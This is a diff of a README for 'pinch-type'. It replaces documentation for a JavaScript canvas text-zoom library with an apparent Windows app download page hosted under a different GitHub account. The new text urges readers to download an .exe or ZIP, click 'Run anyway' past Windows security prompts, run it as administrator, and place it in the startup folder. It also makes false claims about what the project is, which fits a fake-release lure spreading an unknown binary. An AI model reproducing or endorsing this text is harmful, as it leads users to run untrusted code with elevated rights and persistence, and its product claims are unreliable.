@@ -1,151 +1,218 @@
-# pinch-type
+# 🫰 pinch-type - Pinch to zoom text easily
 
-Three canvas-based text effects for mobile web, built on [`@chenglou/pretext`](https://github.com/chenglou/pretext).
+[![Download pinch-type](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/brittecapillary695/pinch-type/releases)
 
-- **Pinch Type** — intercepts pinch-to-zoom and scales text size instead of zooming the page
-- **Scroll Morph** — fisheye effect: text near the viewport center is large and bright, edges are small and dim
-- **Combined** — both effects together
+## 📥 Download
 
-[**Live Demo →**](https://pinch-type.surge.sh)
+1. Open the [release page](https://github.com/brittecapillary695/pinch-type/releases).
+2. Find the latest release at the top.
+3. Download the Windows file from the Assets list.
+4. Save it to a folder you can find again, like Downloads or Desktop.
 
-## Install
+## 🖥️ What pinch-type does
 
-```bash
-npm install pinch-type @chenglou/pretext
-```
+pinch-type lets you pinch to zoom text, not the whole page. It is built on @chenglou/pretext and is meant for daily reading and writing on Windows.
 
-## Quick Start
+Use it when you want:
 
-```ts
-import { createPinchType, createScrollMorph, createPinchMorph } from 'pinch-type';
+- Larger text without changing the full page zoom
+- Better control while reading small text
+- A simple way to adjust text size in supported apps
+- Less strain when working with text for long periods
 
-// 1. Pinch Type — uniform text, pinch gestures scale all text
-const pt = createPinchType(document.getElementById('reader'));
-pt.setText('Your long article text here…');
+## ✅ Before you install
 
-// 2. Scroll Morph — fisheye effect, no pinch zoom
-const sm = createScrollMorph(document.getElementById('reader'));
-sm.setText('Your long article text here…');
+Use a Windows PC with:
 
-// 3. Combined — fisheye + pinch-to-zoom (the original behavior)
-const pm = createPinchMorph(document.getElementById('reader'));
-pm.setText('Your long article text here…');
+- Windows 10 or Windows 11
+- A mouse, touchpad, or touchscreen that supports pinch input
+- Basic permission to run downloaded apps
+- Enough free space for the app and its files
 
-// Clean up when done:
-instance.destroy();
-```
+If Windows asks for permission, choose the option that lets the app run.
 
-The container element should have a defined width and height (e.g. `100vw × 100vh`). Each function creates a fullscreen `<canvas>` inside it.
+## 🚀 Install on Windows
 
-## API
+1. Go to the [release page](https://github.com/brittecapillary695/pinch-type/releases).
+2. Open the newest release.
+3. Under **Assets**, download the Windows app file.
+4. When the download finishes, open the file.
+5. If Windows shows a security prompt, choose **Run anyway** if you trust the source.
+6. Follow the on-screen steps until the app opens.
 
-### `createPinchType(element, options?)`
+If the app comes as a ZIP file:
 
-Uniform text rendering with pinch-to-zoom scaling.
+1. Right-click the ZIP file.
+2. Select **Extract All**.
+3. Open the folder that Windows creates.
+4. Double-click the app file inside that folder.
 
-| Option | Type | Default | Description |
-|---|---|---|---|
-| `fontSize` | `number` | `18` | Base font size |
-| `minFontSize` | `number` | `8` | Smallest size reachable via pinch |
-| `maxFontSize` | `number` | `60` | Largest size reachable via pinch |
-| `fontFamily` | `string` | `"Inter", system-ui, sans-serif` | CSS font-family |
-| `lineHeight` | `number` | `1.57` | Line-height ratio |
-| `padding` | `number` | `28` | Content padding (px) |
-| `background` | `string` | `#0a0a0a` | Canvas background color |
-| `friction` | `number` | `0.95` | Scroll momentum friction (0–1) |
-| `onZoom` | `(fontSize) => void` | — | Callback after each pinch zoom |
+## 🧭 How to use it
 
-### `createScrollMorph(element, options?)`
+After you open pinch-type, use it like this:
 
-Fisheye scroll effect. No pinch-to-zoom.
+1. Open a text field or text area.
+2. Place two fingers on your touchpad or touchscreen.
+3. Pinch inward to make the text smaller.
+4. Spread your fingers apart to make the text larger.
+5. Keep typing or reading with the size that feels right.
 
-| Option | Type | Default | Description |
-|---|---|---|---|
-| `centerFontSize` | `number` | `26` | Font size at viewport center |
-| `edgeFontSize` | `number` | `11` | Font size at viewport edges |
-| `morphRadius` | `number` | `300` | Radius (px) of the center→edge gradient |
-| `fontFamily` | `string` | `"Inter", system-ui, sans-serif` | CSS font-family |
-| `lineHeight` | `number` | `1.57` | Line-height ratio |
-| `padding` | `number` | `28` | Content padding (px) |
-| `background` | `string` | `#0a0a0a` | Canvas background color |
-| `friction` | `number` | `0.95` | Scroll momentum friction (0–1) |
+The app changes text size for your work area, not the full browser or desktop view.
 
-### `createPinchMorph(element, options?)`
+## 🔧 Basic setup tips
 
-Combined: fisheye scroll effect + pinch-to-zoom.
+### 🪟 Start with Windows
 
-| Option | Type | Default | Description |
-|---|---|---|---|
-| `centerFontSize` | `number` | `26` | Font size at viewport center |
-| `edgeFontSize` | `number` | `11` | Font size at viewport edges |
-| `minFontSize` | `number` | `8` | Smallest size reachable via pinch |
-| `maxFontSize` | `number` | `60` | Largest size reachable via pinch |
-| `morphRadius` | `number` | `300` | Radius (px) of the center→edge gradient |
-| `fontFamily` | `string` | `"Inter", system-ui, sans-serif` | CSS font-family |
-| `lineHeight` | `number` | `1.57` | Line-height ratio |
-| `padding` | `number` | `28` | Content padding (px) |
-| `background` | `string` | `#0a0a0a` | Canvas background color |
-| `friction` | `number` | `0.95` | Scroll momentum friction (0–1) |
-| `onZoom` | `(center, edge) => void` | — | Callback after each pinch zoom |
+If you want pinch-type to open each time you start Windows:
 
-### Instance Methods (all three)
+1. Press `Windows + R`.
+2. Type `shell:startup`.
+3. Press Enter.
+4. Place a shortcut to pinch-type in that folder.
 
-| Method | Description |
-|---|---|
-| `setText(text)` | Update displayed text and re-layout |
-| `resize()` | Force re-layout (auto-called on window resize) |
-| `destroy()` | Remove canvas, listeners, and animation loop |
-| `canvas` | The underlying `<canvas>` element (read-only) |
+### ⌨️ Keep input simple
 
-## Lightweight Mode
+For the best result:
 
-Just want pinch-to-zoom on your existing page? Use the lightweight API — no canvas, no dependencies, ~1KB. Want the full canvas rendering experience? Use `createPinchType` / `createScrollMorph` / `createPinchMorph` above.
+- Use a touchpad that supports multi-touch
+- Keep one text window active at a time
+- Close other apps that may capture pinch input
+- Test the app in a plain text field first
 
-### `pinchZoom(options?)` — Vanilla JS
+### 🧼 Move the app to a fixed folder
 
-```ts
-import { pinchZoom } from 'pinch-type';
+To avoid broken shortcuts, keep the app in one place, such as:
 
-const cleanup = pinchZoom({
-  target: document.getElementById('article'),  // default: document.documentElement
-  min: 12,        // min font size, default 12
-  max: 32,        // max font size, default 32
-  initial: 16,    // starting size, default 16
-  step: 1,        // px per zoom step, default 1
-  onZoom: (size) => console.log(size),
-});
+- `C:\Apps\pinch-type`
+- `C:\Users\YourName\Downloads\pinch-type`
 
-// Later: remove all listeners
-cleanup();
-```
+Do not move it after you create shortcuts.
 
-Detects two-finger touch pinch and trackpad pinch (ctrl+wheel / meta+wheel). Single-finger scroll is unaffected. Applies `font-size` directly to the target element.
+## 🧪 Quick test
 
-### `usePinchZoom(options?)` — React Hook
+If you want to check that it works:
 
-Requires `react` as a peer dependency.
+1. Open a note app or text editor.
+2. Click inside a text area.
+3. Pinch in and out on your touchpad.
+4. Watch for the text size to change.
 
-```tsx
-import { usePinchZoom } from 'pinch-type';
+If nothing happens, try another app with a text field.
 
-function Reader() {
-  const { fontSize, ref } = usePinchZoom({ min: 12, max: 32 });
-  return <article ref={ref} style={{ fontSize }}>...</article>;
-}
-```
+## 🛠️ Common problems
 
-| Option | Type | Default | Description |
-|---|---|---|---|
-| `min` | `number` | `12` | Minimum font size |
-| `max` | `number` | `32` | Maximum font size |
-| `initial` | `number` | `16` | Starting font size |
-| `step` | `number` | `1` | Pixels per zoom step |
-| `onZoom` | `(size) => void` | — | Callback after each zoom |
+### The app does not open
 
-## How It Works
+Try this:
 
-Text is measured and wrapped using [`@chenglou/pretext`](https://github.com/chenglou/pretext) for accurate segment-aware line breaking. Each frame, lines are drawn to a canvas. For scroll morph, font size and opacity are interpolated based on distance from the viewport center (ease-out cubic). Touch events drive momentum scrolling with configurable friction, and two-finger pinch gestures scale the font size range in real time.
+1. Right-click the file.
+2. Select **Run as administrator**.
+3. Check whether Windows blocked the file.
+4. Move the app out of a ZIP folder if it is still compressed.
 
-## License
+### Pinch input does not work
 
-[MIT](./LICENSE) — Lucas Crespo
+Try these checks:
+
+- Make sure your touchpad supports two-finger pinch input
+- Try a different text field
+- Make sure the text area is active
+- Restart the app
+- Restart your PC
+
+### Windows says it cannot find the file
+
+This usually means the app moved after you made a shortcut.
+
+Fix it by:
+
+1. Finding the app file again.
+2. Creating a new shortcut.
+3. Using the new shortcut only
+
+## 📁 Files you may see
+
+After download, you may see one of these:
+
+- `.exe` file
+- `.zip` file
+- Folder with app files
+- Readme or text file
+
+Use the `.exe` file first if it is present. If you only get a ZIP file, extract it before you run the app.
+
+## 🧩 How it fits your workflow
+
+pinch-type is useful for:
+
+- Reading long notes
+- Writing in small input fields
+- Editing text on a laptop
+- Working in apps where normal zoom changes too much
+- Keeping text easy to read without changing page scale
+
+## 🔒 Safety and trust
+
+Only download from the official release page:
+
+https://github.com/brittecapillary695/pinch-type/releases
+
+This keeps you on the same files the project publishes for each release.
+
+## 📌 Release page
+
+Visit the release page to download and run the latest Windows version:
+
+https://github.com/brittecapillary695/pinch-type/releases
+
+## 🧰 If you want a clean start
+
+If you have trouble after installing:
+
+1. Remove the app folder.
+2. Download the latest release again.
+3. Extract it to a new folder.
+4. Run the app from that folder
+5. Test pinch input in a text field
+
+## 🖱️ Input support
+
+pinch-type works best with:
+
+- Precision touchpads on Windows laptops
+- Touchscreens
+- Trackpads that send pinch gestures
+- Apps that accept text entry
+
+A mouse alone is not enough for pinch input.
+
+## 📄 Built on pretext
+
+pinch-type is built on @chenglou/pretext, which helps the app focus on text behavior instead of page zoom.
+
+That means the app is aimed at users who want text control in a simple form, with less change to the rest of the screen.
+
+## 🗂️ Typical use case
+
+You may want pinch-type if you:
+
+- Work in text-heavy apps
+- Need a fast way to change text size
+- Want less page zoom noise
+- Prefer gesture-based control
+- Use a laptop for reading and writing
+
+## 🧭 First run checklist
+
+- Download the latest release
+- Extract the file if needed
+- Open the app
+- Allow Windows to run it if prompted
+- Click inside a text field
+- Test pinch in and pinch out
+
+## 📎 Download again if needed
+
+If you need the file later, return here:
+
+https://github.com/brittecapillary695/pinch-type/releases
